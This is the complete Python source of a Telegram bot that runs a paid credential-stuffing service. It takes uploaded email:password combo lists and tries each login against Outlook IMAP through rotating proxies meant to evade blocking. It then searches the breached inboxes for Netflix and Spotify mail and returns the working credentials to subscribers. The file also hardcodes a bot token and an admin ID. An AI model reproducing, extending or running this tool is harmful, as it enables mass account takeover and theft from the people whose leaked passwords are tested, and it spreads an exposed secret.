import os
import imaplib
import logging
import tempfile
import time
import threading
import random
import socks
import socket
from datetime import datetime, timedelta
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# === CONFIGURATION ===
IMAP_SERVER = "imap-mail.outlook.com"
IMAP_PORT = 993
DEFAULT_SERVICES = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@legal.spotify.com"
}
BOT_TOKEN = "7323939104:AAFMJ9vOVovItz1SIP5NSIH8kaehwdu3sDQ"
ADMIN_ID = 7155799990
MAX_THREADS = 5
DELAY_BETWEEN_ATTEMPTS = 2  # Seconds
ACCOUNT_TIMEOUT = 20
PROXY_FILE = "proxy.txt"

CHECK_EMOJI = ["🔍", "🔎", "🕵️", "👀"]
SUCCESS_EMOJI = ["✅", "🎯", "💰", "🔑"]
FAIL_EMOJI = ["❌", "🚫", "💀", "👎"]

user_subscriptions = {ADMIN_ID: datetime.now() + timedelta(days=365)}

# === LOGGING ===
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_proxies(proxies):
    with open(PROXY_FILE, "w") as f:
        for proxy in proxies:
            f.write(proxy + "\n")

# === CORE CHECKER CLASS ===
class AccountChecker:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.lock = threading.Lock()
        self.active_threads = 0
        self.proxies = load_proxies()
        self.proxy_index = 0

    def check_auth(self, user_id: int) -> bool:
        return user_id in user_subscriptions and user_subscriptions[user_id] > datetime.now()

    def get_next_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return proxy

    async def send_aesthetic_message(self, update: Update, text: str, success: bool = None):
        emoji = random.choice(
            SUCCESS_EMOJI if success else FAIL_EMOJI if success is False else CHECK_EMOJI
        )
        return await update.message.reply_text(f"{emoji} {text}")

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.check_auth(user_id):
            await self.send_aesthetic_message(update, "Not authorized or subscription expired!", False)
            return

        doc = update.message.document
        if not doc or not doc.file_name.endswith('.txt'):
            await self.send_aesthetic_message(update, "Send a valid .txt file with email:password combos.", False)
            return

        file = await doc.get_file()
        input_path = os.path.join(self.temp_dir, f"combo_{user_id}.txt")
        await file.download_to_drive(input_path)
        context.user_data['combo_file'] = input_path
        await self.send_aesthetic_message(update, "Combo file received! Use /chk to start checking.")

    async def upload_proxy_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text("Admin only command.")
            return

        doc = update.message.document
        if not doc or not doc.file_name.endswith('.txt'):
            await update.message.reply_text("Send a valid proxy .txt file.")
            return

        file = await doc.get_file()
        await file.download_to_drive(PROXY_FILE)
        self.proxies = load_proxies()
        await update.message.reply_text(f"Loaded {len(self.proxies)} proxies.")

    async def check_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.check_auth(user_id):
            await self.send_aesthetic_message(update, "Not authorized!", False)
            return

        input_path = context.user_data.get('combo_file')
        if not input_path or not os.path.exists(input_path):
            await self.send_aesthetic_message(update, "No combo file found. Send it first!", False)
            return

        if not self.proxies:
            await self.send_aesthetic_message(update, "❌ No working proxies. Use /proxy to upload new list.", False)
            return

        output_path = os.path.join(self.temp_dir, f"valid_{user_id}.txt")
        valid_accounts = []

        try:
            with open(input_path, "r") as f:
                combos = [line.strip() for line in f if ":" in line]

            total = len(combos)
            if total == 0:
                await self.send_aesthetic_message(update, "Combo file is empty or invalid.", False)
                return

            progress_msg = await self.send_aesthetic_message(update, f"Checking {total} combos...")

            for i, combo in enumerate(combos, 1):
                email, password = combo.split(":", 1)

                # Delay to avoid blocking
                time.sleep(DELAY_BETWEEN_ATTEMPTS)

                result = self.check_account_with_proxy(email.strip(), password.strip())
                if result:
                    valid_accounts.append(result)

                # Update progress
                if i % 5 == 0 or i == total:
                    percent = int((i / total) * 100)
                    await progress_msg.edit_text(f"{random.choice(CHECK_EMOJI)} Checked {i}/{total} ({percent}%)")

                if not self.proxies:
                    await self.send_aesthetic_message(update, "All proxies failed. Use /proxy to upload new ones.", False)
                    break

            with open(output_path, "w") as out:
                if valid_accounts:
                    out.write("\n".join(valid_accounts))
                    await self.send_aesthetic_message(update, f"Found {len(valid_accounts)} valid account(s).", True)
                    await update.message.reply_document(InputFile(output_path, filename="valid_accounts.txt"))
                else:
                    out.write("No valid accounts found")
                    await self.send_aesthetic_message(update, "No valid accounts found.", False)

        except Exception as e:
            logger.exception("Error during checking")
            await self.send_aesthetic_message(update, f"Error: {e}", False)
        finally:
            self.cleanup_files(input_path, output_path)

    def check_account_with_proxy(self, email, password):
        proxy = self.get_next_proxy()
        if not proxy:
            return None

        ip, port = proxy.split(":")
        port = int(port)

        socks.setdefaultproxy(socks.HTTP, ip, port)
        socket.socket = socks.socksocket

        try:
            imap = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            imap.login(email, password)
            imap.select("INBOX")
            services = []
            for service_name, sender in DEFAULT_SERVICES.items():
                try:
                    status, messages = imap.search(None, f'FROM "{sender}"')
                    if messages[0]:
                        services.append(service_name)
                except:
                    continue
            imap.logout()
            socket.socket = socket._socketobject  # Reset

            if services:
                return f"{email}:{password} | Services: {', '.join(services)}"
        except Exception as e:
            logger.debug(f"Proxy failed for {proxy} or login failed for {email}: {e}")
            with self.lock:
                if proxy in self.proxies:
                    self.proxies.remove(proxy)
                    save_proxies(self.proxies)
            return None
        finally:
            socket.socket = socket._socketobject  # Ensure reset

    def cleanup_files(self, *paths):
        for path in paths:
            if path and os.path.exists(path):
                try:
                    os.remove(path)
                except Exception as e:
                    logger.debug(f"Failed to remove file {path}: {e}")

# === ADMIN ===
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Admin only.")
        return

    try:
        user_id = int(context.args[0])
        days = int(context.args[1])
        user_subscriptions[user_id] = datetime.now() + timedelta(days=days)
        await update.message.reply_text(f"✅ User {user_id} added for {days} days.")
    except:
        await update.message.reply_text("Usage: /add <user_id> <days>")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Send your combo.txt and use /chk to check. Admins can upload proxies using /proxy.")

# === MAIN ===
def main():
    checker = AccountChecker()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", checker.check_accounts))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(
        MessageHandler(filters.Document.FileExtension("txt") & filters.ChatType.PRIVATE,
                       checker.handle_file)
    )
    app.add_handler(CommandHandler("proxy", checker.upload_proxy_file))
    app.add_handler(
        MessageHandler(filters.Document.FileExtension("txt") & filters.Caption.regex(r'/proxy'),
                       checker.upload_proxy_file)
    )

    logger.info("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
